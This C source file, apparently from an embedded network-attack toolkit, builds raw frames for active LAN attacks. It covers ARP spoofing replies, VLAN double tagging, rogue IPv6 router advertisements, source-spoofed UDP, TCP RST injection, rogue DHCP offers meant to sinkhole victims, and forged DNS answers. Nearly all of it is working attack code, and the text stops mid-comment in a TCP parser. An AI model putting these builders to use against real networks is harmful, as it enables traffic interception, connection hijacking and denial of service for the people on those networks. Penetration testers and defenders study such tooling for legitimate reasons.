/*
 * CaDS Zero - active tooling frame builders (portable, M9).
 *
 * See include/cads/netx/frame.h for the design contract (caller-owned
 * buffers, host-order in / network-order out, no HAL, no static state).
 * This file is the part of modules/netx that is identical on the board
 * and the host - it is unit-tested by golden-byte comparison on the
 * host (tests/unit/test_netx_frame.c), exactly the way the passive
 * detectors in modules/toolbox already are (test_arpwatch.c et al.).
 *
 * All checksums are computed in software here. lwIP is not consulted at
 * all for these frames: ARP, VLAN, and ICMPv6 RA traffic is hand-built
 * on raw L2 precisely because lwIP does not handle it (LWIP_IPV6=0, no
 * VLAN), and the UDP/TCP builders exist so the suite can forge fields lwIP
 * would not let an application control (a spoofed source address, a RST
 * with an attacker-chosen sequence number). See docs/ROADMAP.md M9.
 */

#include "cads/netx/frame.h"

#include <string.h>

/* --- byte-order helpers (host -> network) --------------------------------- */

static void put_be16(uint8_t* p, uint16_t v) {
    p[0] = (uint8_t)(v >> 8);
    p[1] = (uint8_t)(v & 0xFFu);
}

static void put_be32(uint8_t* p, uint32_t v) {
    p[0] = (uint8_t)(v >> 24);
    p[1] = (uint8_t)(v >> 16);
    p[2] = (uint8_t)(v >> 8);
    p[3] = (uint8_t)(v & 0xFFu);
}

/* --- checksums ----------------------------------------------------------- */

/* One's-complement sum over a byte range, RFC 1071. Folded at the end by
 * the caller. Walks bytes in pairs; an odd trailing byte is padded with a
 * zero high byte (RFC 1071's "if the total length is odd, the received
 * data must pad with one zero byte" rule). */
static uint32_t sum_bytes(const uint8_t* p, size_t len) {
    uint32_t sum = 0u;
    size_t i = 0u;
    while((len - i) >= 2u) {
        sum += ((uint32_t)p[i] << 8) | (uint32_t)p[i + 1];
        i += 2u;
    }
    if(i < len) {
        sum += (uint32_t)p[i] << 8; /* odd trailing byte, high half */
    }
    return sum;
}

/* Fold a 32-bit one's-complement running sum into a 16-bit checksum,
 * including the carry-around RFC 1071 mandates. */
static uint16_t fold16(uint32_t sum) {
    while(sum >> 16) {
        sum = (sum & 0xFFFFu) + (sum >> 16);
    }
    return (uint16_t)(~sum & 0xFFFFu);
}

/* --- Ethernet header ----------------------------------------------------- */

static uint16_t put_eth(uint8_t* out, uint16_t cap, uint16_t used,
    const uint8_t dst[6], const uint8_t src[6], uint16_t ethertype) {
    if((uint32_t)used + 14u > cap) return 0u;
    uint8_t* p = out + used;
    memcpy(p, dst, 6u);
    memcpy(p + 6u, src, 6u);
    put_be16(p + 12u, ethertype);
    return (uint16_t)(used + 14u);
}

/* Write just the 2-byte TCI (PCP/DEI/VID) of an 802.1Q tag. The TPID 0x8100
 * already occupies the Ethernet ethertype slot that put_eth() wrote - an
 * 802.1Q tag is TPID-in-the-ethertype-slot followed by TCI followed by the
 * real ethertype, NOT TPID+TCI+TPID+TCI. Writing a second TPID here (the
 * bug this comment replaces) produced 8100 8100 ... which a switch parses as
 * VID 0x100 carrying a garbage ethertype. */
static uint16_t put_vlan_tci(uint8_t* out, uint16_t cap, uint16_t used, uint16_t vid) {
    if((uint32_t)used + 2u > cap) return 0u;
    put_be16(out + used, vid & 0x0FFFu); /* PCP/DEI zero, 12-bit VID */
    return (uint16_t)(used + 2u);
}

static uint16_t put_payload(uint8_t* out, uint16_t cap, uint16_t used,
    const uint8_t* payload, uint16_t payload_len) {
    if(payload == NULL || payload_len == 0u) return used;
    if((uint32_t)used + payload_len > cap) return 0u;
    memcpy(out + used, payload, payload_len);
    return (uint16_t)(used + payload_len);
}

uint16_t cads_netx_build_eth(uint8_t* out, uint16_t cap,
    const uint8_t dst[6], const uint8_t src[6], uint16_t ethertype,
    const uint8_t* payload, uint16_t payload_len) {
    uint16_t used = put_eth(out, cap, 0u, dst, src, ethertype);
    if(used == 0u) return 0u;
    used = put_payload(out, cap, used, payload, payload_len);
    if(used == 0u) return 0u;
    return used;
}

uint16_t cads_netx_build_vlan(uint8_t* out, uint16_t cap,
    const uint8_t dst[6], const uint8_t src[6],
    uint16_t vlan_vid, uint16_t ethertype,
    const uint8_t* payload, uint16_t payload_len) {
    uint16_t used = put_eth(out, cap, 0u, dst, src, CADS_NETX_ETHERTYPE_VLAN);
    if(used == 0u) return 0u;
    used = put_vlan_tci(out, cap, used, vlan_vid);
    if(used == 0u) return 0u;
    /* Inner ethertype follows the tag. */
    if((uint32_t)used + 2u > cap) return 0u;
    put_be16(out + used, ethertype);
    used = (uint16_t)(used + 2u);
    used = put_payload(out, cap, used, payload, payload_len);
    if(used == 0u) return 0u;
    return used;
}

uint16_t cads_netx_build_vlan_qinq(uint8_t* out, uint16_t cap,
    const uint8_t dst[6], const uint8_t src[6],
    uint16_t outer_vid, uint16_t inner_vid, uint16_t ethertype,
    const uint8_t* payload, uint16_t payload_len) {
    /* Outer: eth header with TPID 0x8100 as ethertype, then outer tag, then
     * the inner TPID 0x8100 as ethertype, then inner tag, then the real
     * ethertype, then payload. */
    uint16_t used = put_eth(out, cap, 0u, dst, src, CADS_NETX_ETHERTYPE_VLAN);
    if(used == 0u) return 0u;
    used = put_vlan_tci(out, cap, used, outer_vid);
    if(used == 0u) return 0u;
    if((uint32_t)used + 2u > cap) return 0u;
    put_be16(out + used, CADS_NETX_ETHERTYPE_VLAN); /* inner TPID */
    used = (uint16_t)(used + 2u);
    used = put_vlan_tci(out, cap, used, inner_vid);
    if(used == 0u) return 0u;
    if((uint32_t)used + 2u > cap) return 0u;
    put_be16(out + used, ethertype);
    used = (uint16_t)(used + 2u);
    used = put_payload(out, cap, used, payload, payload_len);
    if(used == 0u) return 0u;
    return used;
}

/* --- ARP ------------------------------------------------------------------ */

uint16_t cads_netx_build_arp_reply(uint8_t* out, uint16_t cap,
    const uint8_t dst[6], const uint8_t src[6],
    const uint8_t sender_mac[6], uint32_t sender_ip_host,
    uint32_t target_ip_host) {
    uint16_t used = put_eth(out, cap, 0u, dst, src, CADS_NETX_ETHERTYPE_ARP);
    if(used == 0u) return 0u;
    if((uint32_t)used + 28u > cap) return 0u;
    uint8_t* p = out + used;
    put_be16(p + 0u, 0x0001u);   /* hardware type: Ethernet */
    put_be16(p + 2u, 0x0800u);   /* protocol type: IPv4 */
    p[4u] = 6u;                  /* HLEN */
    p[5u] = 4u;                  /* PLEN */
    put_be16(p + 6u, 0x0002u);   /* opcode: REPLY */
    memcpy(p + 8u, sender_mac, 6u);
    put_be32(p + 14u, sender_ip_host);
    memcpy(p + 18u, src, 6u);    /* target MAC = frame's src (a reply's target) */
    put_be32(p + 24u, target_ip_host);
    return (uint16_t)(used + 28u);
}

uint16_t cads_netx_build_arp_gratuitous(uint8_t* out, uint16_t cap,
    const uint8_t src[6], uint32_t claimed_ip_host) {
    static const uint8_t bcast[6] = {0xFFu, 0xFFu, 0xFFu, 0xFFu, 0xFFu, 0xFFu};
    /* Gratuitous ARP: a REPLY where sender IP == target IP and dst MAC is
     * broadcast. Target MAC is the sender's own (unspecified, as the entry
     * is being announced rather than answered). */
    return cads_netx_build_arp_reply(out, cap, bcast, src, src, claimed_ip_host, claimed_ip_host);
}

uint16_t cads_netx_build_arp_request(uint8_t* out, uint16_t cap,
    const uint8_t dst[6], const uint8_t src[6],
    const uint8_t sender_mac[6], uint32_t sender_ip_host,
    uint32_t target_ip_host) {
    uint16_t used = put_eth(out, cap, 0u, dst, src, CADS_NETX_ETHERTYPE_ARP);
    if(used == 0u) return 0u;
    if((uint32_t)used + 28u > cap) return 0u;
    uint8_t* p = out + used;
    put_be16(p + 0u, 0x0001u);   /* hardware type: Ethernet */
    put_be16(p + 2u, 0x0800u);   /* protocol type: IPv4 */
    p[4u] = 6u;                  /* HLEN */
    p[5u] = 4u;                  /* PLEN */
    put_be16(p + 6u, 0x0001u);   /* opcode: REQUEST */
    memcpy(p + 8u, sender_mac, 6u);
    put_be32(p + 14u, sender_ip_host);
    memset(p + 18u, 0u, 6u);     /* target MAC unknown - the question being asked */
    put_be32(p + 24u, target_ip_host);
    return (uint16_t)(used + 28u);
}

/* --- IPv4 / UDP / TCP ----------------------------------------------------- */

/* Build a 20-byte IPv4 header at `out+used`, leaving the checksum field
 * zero, and return the new `used` (0 on overflow). `total_len` is the
 * full IP datagram length (header + payload). */
static uint16_t put_ipv4_hdr(uint8_t* out, uint16_t cap, uint16_t used,
    uint8_t proto, uint32_t src_ip_host, uint32_t dst_ip_host, uint16_t total_len) {
    if((uint32_t)used + 20u > cap) return 0u;
    uint8_t* p = out + used;
    p[0u] = 0x45u;                /* version 4, IHL 5 (20-byte header, no options) */
    p[1u] = 0u;                   /* DSCP/ECN zero */
    put_be16(p + 2u, total_len);
    put_be16(p + 4u, 0u);         /* identification */
    put_be16(p + 6u, 0x4000u);    /* flags: DF set, fragment offset 0 */
    p[8u] = 64u;                  /* TTL */
    p[9u] = proto;
    put_be16(p + 10u, 0u);        /* checksum (filled below) */
    put_be32(p + 12u, src_ip_host);
    put_be32(p + 16u, dst_ip_host);

    /* Header checksum is over the header only, with the checksum field
     * zero (which it currently is). */
    uint32_t s = sum_bytes(p, 20u);
    put_be16(p + 10u, fold16(s));
    return (uint16_t)(used + 20u);
}

uint16_t cads_netx_build_ipv4(uint8_t* out, uint16_t cap,
    const uint8_t dst[6], const uint8_t src[6],
    uint8_t proto, uint32_t src_ip_host, uint32_t dst_ip_host,
    const uint8_t* payload, uint16_t payload_len) {
    uint16_t used = put_eth(out, cap, 0u, dst, src, CADS_NETX_ETHERTYPE_IPV4);
    if(used == 0u) return 0u;
    uint16_t total_len = (uint16_t)(20u + payload_len);
    used = put_ipv4_hdr(out, cap, used, proto, src_ip_host, dst_ip_host, total_len);
    if(used == 0u) return 0u;
    used = put_payload(out, cap, used, payload, payload_len);
    if(used == 0u) return 0u;
    return used;
}

/* IPv4 pseudo-header for UDP/TCP checksums: src IP, dst IP, zero, proto,
 * transport length. Returns the running one's-complement sum (NOT folded). */
static uint32_t ipv4_pseudo_sum(uint32_t src_ip_host, uint32_t dst_ip_host, uint8_t proto, uint16_t l4_len) {
    uint32_t s = 0u;
    s += (src_ip_host >> 16) & 0xFFFFu;
    s += src_ip_host & 0xFFFFu;
    s += (dst_ip_host >> 16) & 0xFFFFu;
    s += dst_ip_host & 0xFFFFu;
    s += (uint32_t)proto;
    s += l4_len;
    return s;
}

uint16_t cads_netx_build_udp(uint8_t* out, uint16_t cap,
    const uint8_t dst[6], const uint8_t src[6],
    uint32_t src_ip_host, uint32_t dst_ip_host,
    uint16_t src_port, uint16_t dst_port,
    const uint8_t* payload, uint16_t payload_len) {
    uint16_t used = put_eth(out, cap, 0u, dst, src, CADS_NETX_ETHERTYPE_IPV4);
    if(used == 0u) return 0u;
    uint16_t udp_len = (uint16_t)(8u + payload_len);
    uint16_t total_len = (uint16_t)(20u + udp_len);
    used = put_ipv4_hdr(out, cap, used, 17u, src_ip_host, dst_ip_host, total_len);
    if(used == 0u) return 0u;
    if((uint32_t)used + 8u > cap) return 0u;
    uint8_t* udp = out + used;
    put_be16(udp + 0u, src_port);
    put_be16(udp + 2u, dst_port);
    put_be16(udp + 4u, udp_len);
    put_be16(udp + 6u, 0u); /* checksum, filled below */
    used = (uint16_t)(used + 8u);
    used = put_payload(out, cap, used, payload, payload_len);
    if(used == 0u) return 0u;

    /* UDP checksum over pseudo-header + UDP header + payload. UDP allows
     * a zero checksum (IPv4-only), but we compute a real one so forged
     * replies pass a receiver's CHECKSUM_CHECK_UDP. */
    uint32_t s = ipv4_pseudo_sum(src_ip_host, dst_ip_host, 17u, udp_len);
    s += sum_bytes(udp, 8u);
    if(payload_len) s += sum_bytes(out + (uint16_t)(used - payload_len), payload_len);
    put_be16(udp + 6u, fold16(s));
    return used;
}

uint16_t cads_netx_build_tcp_rst(uint8_t* out, uint16_t cap,
    const uint8_t dst[6], const uint8_t src[6],
    uint32_t src_ip_host, uint32_t dst_ip_host,
    uint16_t src_port, uint16_t dst_port,
    uint32_t seq_host) {
    uint16_t used = put_eth(out, cap, 0u, dst, src, CADS_NETX_ETHERTYPE_IPV4);
    if(used == 0u) return 0u;
    uint16_t tcp_len = 20u; /* header only, no options, no payload */
    uint16_t total_len = (uint16_t)(20u + tcp_len);
    used = put_ipv4_hdr(out, cap, used, 6u, src_ip_host, dst_ip_host, total_len);
    if(used == 0u) return 0u;
    if((uint32_t)used + 20u > cap) return 0u;
    uint8_t* tcp = out + used;
    put_be16(tcp + 0u, src_port);
    put_be16(tcp + 2u, dst_port);
    put_be32(tcp + 4u, seq_host);  /* sequence number */
    put_be32(tcp + 8u, 0u);       /* ack number (0 - RST carries no ACK) */
    tcp[12u] = 0x50u;             /* data offset: 5 (20-byte header), no options */
    tcp[13u] = 0x04u;              /* flags: RST only */
    put_be16(tcp + 14u, 0u);       /* window */
    put_be16(tcp + 16u, 0u);       /* checksum (filled below) */
    put_be16(tcp + 18u, 0u);       /* urgent pointer */
    used = (uint16_t)(used + 20u);

    uint32_t s = ipv4_pseudo_sum(src_ip_host, dst_ip_host, 6u, tcp_len);
    s += sum_bytes(tcp, 20u);
    put_be16(tcp + 16u, fold16(s));
    return used;
}

/* --- ICMPv6 Router Advertisement ----------------------------------------- */

/* Derive an EUI-64 interface identifier from a 48-bit MAC and write it
 * into an 8-byte buffer: flip the U/L bit of the OUI, insert 0xFFFE
 * between OUI and NIC. RFC 4291 §2.5.1. */
static void eui64_from_mac(const uint8_t mac[6], uint8_t eui64[8]) {
    eui64[0u] = mac[0u] ^ 0x02u;
    eui64[1u] = mac[1u];
    eui64[2u] = mac[2u];
    eui64[3u] = 0xFFu;
    eui64[4u] = 0xFEu;
    eui64[5u] = mac[3u];
    eui64[6u] = mac[4u];
    eui64[7u] = mac[5u];
}

uint16_t cads_netx_build_icmpv6_ra(uint8_t* out, uint16_t cap,
    const uint8_t src_mac[6],
    const uint8_t prefix[16],
    uint32_t valid_lt_host, uint32_t preferred_lt_host, uint16_t mtu) {
    static const uint8_t all_nodes_mac[6] = {0x33u, 0x33u, 0u, 0u, 0u, 0x01u};

    /* ICMPv6 message body: RA (type 134) + Prefix Info option (+ optional
     * MTU option). Built first into a local buffer so the IPv6 payload
     * length is known before the IPv6 header is written, and so the
     * ICMPv6 checksum can be computed over the final byte layout. */
    uint8_t icmpv6[64u];
    size_t icmp_len = 0u;

    icmpv6[0u] = 134u;  /* type: Router Advertisement */
    icmpv6[1u] = 0u;    /* code */
    icmpv6[2u] = 0u; icmpv6[3u] = 0u; /* checksum, filled below */
    icmpv6[4u] = 64u;   /* cur hop limit */
    icmpv6[5u] = 0u;    /* flags: no M, no O */
    put_be16(icmpv6 + 6u, 1800u);    /* router lifetime, seconds */
    put_be32(icmpv6 + 8u, 0u);      /* reachable time */
    put_be32(icmpv6 + 12u, 0u);     /* retrans timer */
    icmp_len = 16u;

    /* Prefix Information option (type 3, length 8 units of 8 bytes). */
    icmpv6[icmp_len + 0u] = 3u;     /* type: Prefix Information */
    icmpv6[icmp_len + 1u] = 4u;     /* length: 4 units (32 bytes) */
    icmpv6[icmp_len + 2u] = 64u;    /* prefix length */
    /* L (on-link) + A (autonomous) = 0xC0. A prefix a host should both
     * install as on-link and autoconfigure an address from. */
    icmpv6[icmp_len + 3u] = 0xC0u;
    put_be32(icmpv6 + icmp_len + 4u, valid_lt_host);
    put_be32(icmpv6 + icmp_len + 8u, preferred_lt_host);
    put_be32(icmpv6 + icmp_len + 12u, 0u); /* reserved */
    memcpy(icmpv6 + icmp_len + 16u, prefix, 16u);
    icmp_len += 32u;

    if(mtu != 0u) {
        icmpv6[icmp_len + 0u] = 5u; /* type: MTU */
        icmpv6[icmp_len + 1u] = 1u; /* length: 1 unit (8 bytes) */
        put_be16(icmpv6 + icmp_len + 2u, 0u);
        put_be32(icmpv6 + icmp_len + 4u, mtu);
        icmp_len += 8u;
    }

    /* Ethernet + IPv6 header. */
    uint16_t used = put_eth(out, cap, 0u, all_nodes_mac, src_mac, CADS_NETX_ETHERTYPE_IPV6);
    if(used == 0u) return 0u;
    if((uint32_t)used + 40u + icmp_len > cap) return 0u;

    uint8_t src_ip6[16];
    memset(src_ip6, 0u, sizeof(src_ip6));
    src_ip6[0u] = 0xFEu;
    src_ip6[1u] = 0x80u;
    /* bytes 2..7 of the /10 link-local prefix are zero; EUI-64 fills 8..15 */
    eui64_from_mac(src_mac, src_ip6 + 8u);

    static const uint8_t all_nodes_ip6[16] = {
        0xFFu, 0x02u, 0u, 0u, 0u, 0u, 0u, 0u, 0u, 0u, 0u, 0u, 0u, 0u, 0u, 0x01u};

    uint8_t* ip6 = out + used;
    ip6[0u] = 0x60u;              /* version 6, traffic class 0, flow label 0 */
    ip6[1u] = 0u; ip6[2u] = 0u; ip6[3u] = 0u;
    put_be16(ip6 + 4u, (uint16_t)icmp_len); /* payload length */
    ip6[6u] = 58u;                 /* next header: ICMPv6 */
    ip6[7u] = 255u;               /* hop limit (RFC 4861 requires 255 for RA) */
    memcpy(ip6 + 8u, src_ip6, 16u);
    memcpy(ip6 + 24u, all_nodes_ip6, 16u);
    used = (uint16_t)(used + 40u);

    memcpy(out + used, icmpv6, icmp_len);
    uint8_t* icmp = out + used;
    used = (uint16_t)(used + (uint16_t)icmp_len);

    /* ICMPv6 checksum over the IPv6 pseudo-header (src, dst, length, next
     * header) + the ICMPv6 message. RFC 2460 §8.1 / RFC 4861. */
    uint32_t s = 0u;
    for(int i = 0; i < 16; i += 2) {
        s += ((uint32_t)src_ip6[i] << 8) | (uint32_t)src_ip6[i + 1];
    }
    for(int i = 0; i < 16; i += 2) {
        s += ((uint32_t)all_nodes_ip6[i] << 8) | (uint32_t)all_nodes_ip6[i + 1];
    }
    s += (uint32_t)icmp_len;       /* upper-layer packet length (32-bit, no fold needed yet) */
    s += 58u;                      /* next header */
    s += sum_bytes(icmp, icmp_len);
    put_be16(icmp + 2u, fold16(s));

    return used;
}

/* --- CoAP GET (hand-built, no lib) --------------------------------------- */

uint16_t cads_netx_build_coap_get(uint8_t* out, uint16_t cap,
    uint16_t msg_id, const char* uri_path) {
    /* 4-byte header: Ver=1, Type=CON(0), TKL=0 | Code 0.01 GET | Message ID. */
    if((uint32_t)4u > cap) return 0u;
    out[0u] = 0x40u; /* 0100 0000: version 1, type CON, token length 0 */
    out[1u] = 0x01u; /* code 0.01 = GET */
    put_be16(out + 2u, msg_id);
    uint16_t used = 4u;

    /* URI-Path options (option number 11). Each slash-separated segment is
     * one option. The first segment's option delta is 11 (from option 0);
     * every later segment's delta is 0 (same option number, repeated). Only
     * the simple form is used: delta <= 12 and length <= 12 each fit a
     * single nibble byte (delta<<4 | len). */
    uint16_t prev_option = 0u;
    const char* seg = (uri_path != NULL) ? uri_path : "";
    while(*seg != '\0') {
        while(*seg == '/') seg++;             /* skip leading/inner slashes */
        const char* end = seg;
        while(*end != '\0' && *end != '/') end++;
        size_t seg_len = (size_t)(end - seg);
        if(seg_len == 0u) break;              /* trailing slash only */
        if(seg_len > 12u) return 0u;           /* extended-length form unsupported */
        uint16_t delta = (uint16_t)(11u - prev_option);
        if((uint32_t)used + 1u + seg_len > cap) return 0u;
        out[used] = (uint8_t)((delta << 4) | (uint8_t)seg_len);
        used = (uint16_t)(used + 1u);
        memcpy(out + used, seg, seg_len);
        used = (uint16_t)(used + (uint16_t)seg_len);
        prev_option = 11u;
        seg = end;
    }
    return used;
}

/* --- DHCP (rogue OFFER/ACK) ---------------------------------------------- */

/* Build a 278-byte DHCP message (BOOTREPLY) into `out`: the fixed 240-byte
 * BOOTP header + the magic cookie + the standard option set a rogue server
 * needs to sinkhole a victim (server-id, subnet mask, router, DNS, lease time,
 * end). `msg_type` is 2 for OFFER or 5 for ACK. Returns the message length
 * (0 on a too-small buffer). The IP/UDP envelope is added by the caller via
 * cads_netx_build_udp, which is what makes the checksums correct. */
static uint16_t build_dhcp_msg(uint8_t* out, uint16_t cap, uint8_t msg_type,
    uint32_t server_ip_host, uint32_t client_ip_host,
    const uint8_t client_mac[6], uint32_t xid_host,
    uint32_t lease_host, uint32_t router_ip_host, uint32_t dns_ip_host) {
    if(cap < 278u) return 0u;
    memset(out, 0u, 240u);
    out[0u] = 2u;   /* op: BOOTREPLY */
    out[1u] = 1u;   /* htype: Ethernet */
    out[2u] = 6u;   /* hlen */
    out[3u] = 0u;   /* hops */
    put_be32(out + 4u, xid_host);
    /* secs(8), flags(10): 0 - unicast-capable reply. The OFFER is broadcast by
     * the engine (dst MAC ff:.., dst IP 255.255.255.255) because the client has
     * no address yet; the ACK to a REQUEST that carries ciaddr can be unicast. */
    /* ciaddr(12): 0 (left zero); the engine builds OFFER before the client has
     * any address, and an ACK to a RENEWING client would set ciaddr - the rogue
     * engine does not track that, so it stays 0 and the ACK is broadcast too). */
    put_be32(out + 16u, client_ip_host); /* yiaddr: the lease we offer */
    put_be32(out + 20u, server_ip_host); /* siaddr: next server = us */
    /* giaddr(24): 0 (no relay) */
    memcpy(out + 28u, client_mac, 6u);   /* chaddr */
    /* chaddr tail (34..43), sname (44..107), file (108..239): zero (memset) */

    uint16_t i = 240u;
    out[i++] = 0x63u; out[i++] = 0x82u; out[i++] = 0x53u; out[i++] = 0x63u; /* magic cookie */
    out[i++] = 53u; out[i++] = 1u; out[i++] = msg_type;                    /* DHCP Message Type */
    out[i++] = 54u; out[i++] = 4u; put_be32(out + i, server_ip_host); i += 4u; /* Server Identifier */
    out[i++] = 1u;  out[i++] = 4u; put_be32(out + i, 0xFFFFFF00u); i += 4u;  /* Subnet Mask /24 */
    out[i++] = 3u;  out[i++] = 4u; put_be32(out + i, router_ip_host); i += 4u;/* Router */
    out[i++] = 6u;  out[i++] = 4u; put_be32(out + i, dns_ip_host); i += 4u;  /* DNS */
    out[i++] = 51u; out[i++] = 4u; put_be32(out + i, lease_host); i += 4u;   /* Lease Time */
    out[i++] = 255u; /* End */
    return i; /* 278 */
}

uint16_t cads_netx_build_dhcp_offer(uint8_t* out, uint16_t cap,
    const uint8_t dst[6], const uint8_t src[6],
    uint32_t server_ip_host, uint32_t client_ip_host,
    const uint8_t client_mac[6], uint32_t xid_host,
    uint32_t lease_host, uint32_t router_ip_host, uint32_t dns_ip_host) {
    uint8_t msg[278u];
    uint16_t mlen = build_dhcp_msg(msg, sizeof(msg), 2u, server_ip_host, client_ip_host,
        client_mac, xid_host, lease_host, router_ip_host, dns_ip_host);
    if(mlen == 0u) return 0u;
    /* OFFER: server->client, UDP 67->68, broadcast (engine passes broadcast dst). */
    return cads_netx_build_udp(out, cap, dst, src, server_ip_host, client_ip_host,
        67u, 68u, msg, mlen);
}

uint16_t cads_netx_build_dhcp_ack(uint8_t* out, uint16_t cap,
    const uint8_t dst[6], const uint8_t src[6],
    uint32_t server_ip_host, uint32_t client_ip_host,
    const uint8_t client_mac[6], uint32_t xid_host,
    uint32_t lease_host, uint32_t router_ip_host, uint32_t dns_ip_host) {
    uint8_t msg[278u];
    uint16_t mlen = build_dhcp_msg(msg, sizeof(msg), 5u, server_ip_host, client_ip_host,
        client_mac, xid_host, lease_host, router_ip_host, dns_ip_host);
    if(mlen == 0u) return 0u;
    return cads_netx_build_udp(out, cap, dst, src, server_ip_host, client_ip_host,
        67u, 68u, msg, mlen);
}

bool cads_netx_parse_dhcp_discover(const uint8_t* msg, uint16_t len,
    cads_netx_dhcp_discover_t* out) {
    if(out == NULL || msg == NULL) return false;
    if(len < 240u) return false;
    if(msg[0u] != 1u) return false; /* BOOTREQUEST */
    if(msg[1u] != 1u) return false; /* Ethernet */
    if(msg[2u] != 6u) return false; /* hlen */
    memset(out, 0u, sizeof(*out));
    out->xid_host = ((uint32_t)msg[4u] << 24) | ((uint32_t)msg[5u] << 16) |
                    ((uint32_t)msg[6u] << 8)  | (uint32_t)msg[7u];
    out->client_ip_host = ((uint32_t)msg[12u] << 24) | ((uint32_t)msg[13u] << 16) |
                          ((uint32_t)msg[14u] << 8)  | (uint32_t)msg[15u];
    memcpy(out->client_mac, msg + 28u, 6u);

    /* Options start at offset 240 with the magic cookie. Absence of the cookie
     * is not fatal - a non-RFC2132 DISCOVER still has a usable chaddr/xid. */
    if(len < 244u) return true;
    if(msg[236u] != 0x63u || msg[237u] != 0x82u || msg[238u] != 0x53u || msg[239u] != 0x63u) {
        return true;
    }
    uint16_t i = 240u;
    while(i < len) {
        uint8_t opt = msg[i];
        if(opt == 0u) { i++; continue; } /* PAD */
        if(opt == 255u) break;            /* END */
        i++;
        if(i >= len) break;
        uint8_t olen = msg[i];
        i++;
        if((uint32_t)i + olen > len) break;
        if(opt == 50u && olen == 4u) {   /* Requested IP Address */
            out->requested_ip_host = ((uint32_t)msg[i] << 24) | ((uint32_t)msg[i + 1u] << 16) |
                                     ((uint32_t)msg[i + 2u] << 8) | (uint32_t)msg[i + 3u];
        }
        i = (uint16_t)(i + olen);
    }
    return true;
}

/* --- DNS (rogue sinkhole) ------------------------------------------------- */

bool cads_netx_parse_dns_query(const uint8_t* msg, uint16_t len,
    cads_netx_dns_query_t* out, uint16_t* question_offset_out) {
    if(out == NULL || msg == NULL || len < 12u) return false;
    uint16_t flags = ((uint16_t)msg[2u] << 8) | msg[3u];
    if((flags & 0x8000u) != 0u) return false; /* QR=1 is a response */
    if((flags & 0x7800u) != 0u) return false; /* opcode != 0 (standard query) */
    uint16_t qd = ((uint16_t)msg[4u] << 8) | msg[5u];
    if(qd != 1u) return false; /* only one question supported */
    memset(out, 0u, sizeof(*out));
    out->txid_host = ((uint16_t)msg[0u] << 8) | msg[1u];

    /* Question section starts at offset 12: label-encoded name then qtype(2)+qclass(2). */
    uint16_t i = 12u;
    while(i < len) {
        uint8_t lablen = msg[i];
        if(lablen == 0u) { i++; break; }             /* root label, name ends */
        if((lablen & 0xC0u) != 0u) return false;     /* compression pointer - not in a fresh query */
        i = (uint16_t)(i + 1u + lablen);
        if(i >= len) return false;
    }
    if((uint32_t)i + 4u > len) return false;
    out->qtype_host  = ((uint16_t)msg[i] << 8) | msg[i + 1u];
    out->qclass_host = ((uint16_t)msg[i + 2u] << 8) | msg[i + 3u];
    out->question_len = (uint16_t)(i + 4u - 12u);
    if(question_offset_out != NULL) *question_offset_out = 12u;
    return true;
}

uint16_t cads_netx_build_dns_response(uint8_t* out, uint16_t cap,
    const uint8_t dst[6], const uint8_t src[6],
    uint32_t server_ip_host, uint32_t client_ip_host,
    uint16_t client_port,
    const uint8_t* query_msg, uint16_t query_len,
    uint32_t answer_ip_host, bool nxdomain) {
    cads_netx_dns_query_t q;
    uint16_t qoff = 0u;
    if(!cads_netx_parse_dns_query(query_msg, query_len, &q, &qoff)) return 0u;

    /* Only a class-IN A query gets a sinkhole answer; anything else gets
     * NXDOMAIN so the victim's lookup still fails closed (no leakage). */
    bool answer_a = (!nxdomain) && (q.qtype_host == 1u) && (q.qclass_host == 1u);

    uint8_t msg[320u];
    uint16_t mi = 0u;
    put_be16(msg + 0u, q.txid_host);
    uint16_t flags = 0x8000u | 0x0400u; /* QR=1, AA=1, opcode 0, rcode 0 */
    if(nxdomain) flags |= 0x0003u;      /* RCODE=3 NXDOMAIN */
    put_be16(msg + 2u, flags);
    put_be16(msg + 4u, 1u);             /* qdcount: echo the one question */
    put_be16(msg + 6u, answer_a ? 1u : 0u); /* ancount */
    put_be16(msg + 8u, 0u);
    put_be16(msg + 10u, 0u);
    mi = 12u;

    /* Echo the question section verbatim - the response's question must
     * match the query's (the answer's name pointer back to offset 12 relies
     * on this). */
    uint16_t qlen = q.question_len;
    if((uint32_t)mi + qlen > sizeof(msg)) return 0u;
    memcpy(msg + mi, query_msg + qoff, qlen);
    mi = (uint16_t)(mi + qlen);

    if(answer_a) {
        if((uint32_t)mi + 16u > sizeof(msg)) return 0u;
        put_be16(msg + mi, 0xC00Cu); mi += 2u; /* name pointer to offset 12 */
        put_be16(msg + mi, 1u);  mi += 2u;     /* type A */
        put_be16(msg + mi, 1u);  mi += 2u;     /* class IN */
        put_be32(msg + mi, 60u); mi += 4u;     /* TTL 60s */
        put_be16(msg + mi, 4u);  mi += 2u;     /* RDLENGTH */
        put_be32(msg + mi, answer_ip_host); mi += 4u;
    }

    /* Server->client, UDP 53->client_port. The engine resolved the client's
     * MAC (ARP cache of the just-arrived query) for the L2 dst. */
    return cads_netx_build_udp(out, cap, dst, src, server_ip_host, client_ip_host,
        53u, client_port, msg, mi);
}

/* --- EAPOL (802.1X) ------------------------------------------------------ */

bool cads_netx_parse_eapol(const uint8_t* frame, uint16_t len,
    cads_netx_eapol_t* out) {
    if(out == NULL || frame == NULL) return false;
    if(len < 14u) return false;
    uint16_t ethertype = ((uint16_t)frame[12u] << 8) | frame[13u];
    if(ethertype != CADS_NETX_ETHERTYPE_EAPOL) return false;
    memset(out, 0u, sizeof(*out));
    memcpy(out->supplicant_mac, frame + 6u, 6u); /* Ethernet src = supplicant */
    if(len < 14u + 4u) return true;              /* EAPOL header only */
    const uint8_t* eapol = frame + 14u;
    out->eapol_type = eapol[1u];                 /* 0=EAP-Packet, 1=Start, ... */
    if(out->eapol_type != 0u) return true;       /* not an EAP packet */
    if(len < 14u + 4u + 4u) return true;         /* EAP header min */
    const uint8_t* eap = eapol + 4u;
    out->eap_code = eap[0u];
    out->eap_id = eap[1u];
    if((out->eap_code == 1u || out->eap_code == 2u) && len >= 14u + 4u + 5u) {
        out->eap_type = eap[4u];                  /* Identity(1), etc. */
    }
    return true;
}

/* --- TCP segment parse (RST daemon) -------------------------------------- */

bool cads_netx_parse_tcp_seg(const uint8_t* frame, uint16_t len,
    cads_netx_tcp_seg_t* out) {
    if(out == NULL || frame == NULL) return false;
    if(len < 14u + 20u + 20u) return false;
    uint16_t ethertype = ((uint16_t)frame[12u] << 8) | frame[13u];
    uint16_t off = 14u;
    out->has_vlan = false;
    out->vlan_vid = 0u;
    /* Skip one or two VLAN tags (0x8100). The TCP RST daemon observes
